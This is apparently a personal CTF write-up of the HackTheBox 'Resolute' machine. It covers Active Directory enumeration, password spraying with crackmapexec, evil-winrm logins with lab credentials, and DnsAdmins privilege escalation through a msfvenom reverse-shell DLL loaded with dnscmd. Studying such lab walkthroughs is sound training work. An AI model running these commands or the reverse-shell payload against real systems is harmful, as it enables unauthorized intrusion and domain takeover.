
## Reconnaissance

### nmap 

```
nmap -sC -sV -oN resolute_light 192.168.96.155
```

![](machine/resolute/IMG/0.png)
- Service 
> DNS port 43
> Kerberos port 88
> rpc port 135, 594
> SMB port 445 
> ldap port 636
> winrm port 5985

### smbclient 

```
smbclient 
```

![[machine/resolute/IMG/1.png]]

###  rpcclient 

```
rpcclient -U "" -N 10.129.96.155
```

![[machine/resolute/IMG/2.png]]

```
enumdomusers
```

![[machine/resolute/IMG/3.png]]
![[machine/resolute/IMG/30.png]]


```
queryuser 0x1f4
```

![[machine/resolute/IMG/4.png]]

```
querydispinfo
```

![[machine/resolute/IMG/5.png]]

- Get Credentials 

```
marko / Welcome123!
```

![[machine/resolute/IMG/6.png]]

- Using this credential to list smb 
- Failed 

```
crackmapexec smb 10.129.96.155 --shares -u 'marko' -p 'Welcome123!'
```

![[machine/resolute/IMG/7.png]]

## Exploit 

- Create  user list by rpc enum domain users result 
![](machine/resolute/IMG/8.png)
- Spray Password Attack
```
crackmapexec smb 10.129.96.155 -u users.txt -p "Welcome123\!" --shares
```

![[machine/resolute/IMG/9.png]]

![[machine/resolute/IMG/10.png]]

- evil-winrm login by malanie
```
evil-winrm -i 10.129.96.155 -P 5985 -u 'malanie' -p 'Welcome123!'
```

![[machine/resolute/IMG/11.png]]

- Confirm current user 
```
whoami
```

![[machine/resolute/IMG/12.png]]

- List C directory

![[machine/resolute/IMG/13.png]]

- List PSTranscripts
```
ls -force
```

![[machine/resolute/IMG/14.png]]

- List \PSTranscripts\20191203
```
ls -force
```

![[machine/resolute/IMG/15.png]]

- Check text file 

![[machine/resolute/IMG/16.png]]

- Find credential 
```
ryan / Serv3r4Admin4cc123!
```

![[machine/resolute/IMG/17.png]]

![[machine/resolute/IMG/18.png]]

## Privilege Escalation 

- Login by evil-winrm

```
evil-winrm -i 10.129.96.155 -P 5985 -u 'ryan' -p Serv3r4Admin4cc123!
```

- List ryan directory

![[machine/resolute/IMG/19.png]]

- Confirm current user
```
whoami 
```
- List desktop (include hidden file)
- Find note text 
- Read note text 
```
ls -force 
type note.txt
```

![[machine/resolute/IMG/20.png]]

- Generate dll payload 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.145 LPORT=1337 -f dll -o PE2.dll
```

![[machine/resolute/IMG/21.png]]

- Launch impacket-smbserver 
```
smbserver.py s /root
```

![[machine/resolute/IMG/22.png]]

- Execute dnscmd to re-config the dns
```
dnscmd.exe /config /serverlevelplugindll \\10.10.17.145\s\PE2.dll
```

![[machine/resolute/IMG/23.png]]

```
sc.exe stop dns 
```

![[machine/resolute/IMG/24.png]]

```
sc.exe start dns 
```

![[machine/resolute/IMG/25.png]]

- Confirm smbserver get response

![[machine/resolute/IMG/26.png]]

- Confirm nc get reverse shell

![[machine/resolute/IMG/27.png]]

- Confirm root user and ipconfig 

![[machine/resolute/IMG/28.png]]

- Get root flag

![(./IMG/root flag.png)
## Reference 

- [Write-up](https://0xdf.gitlab.io/2020/05/30/htb-resolute.html)
- [AD security group - dnsadmin](https://learn.microsoft.com/zh-tw/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins)
- [Windows Privilege Escalation: DnsAdmins to DomainAdmin](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/)
- [域渗透——利用dnscmd在DNS服务器上实现远程加载Dll](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8dnscmd%E5%9C%A8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDDll)
- [AD Security - [Day25] 一起來學 AD 安全吧！： DnsAdmins 提權](https://ithelp.ithome.com.tw/articles/10307044?sc=iThelpR)

###### tags: `HackTheBox`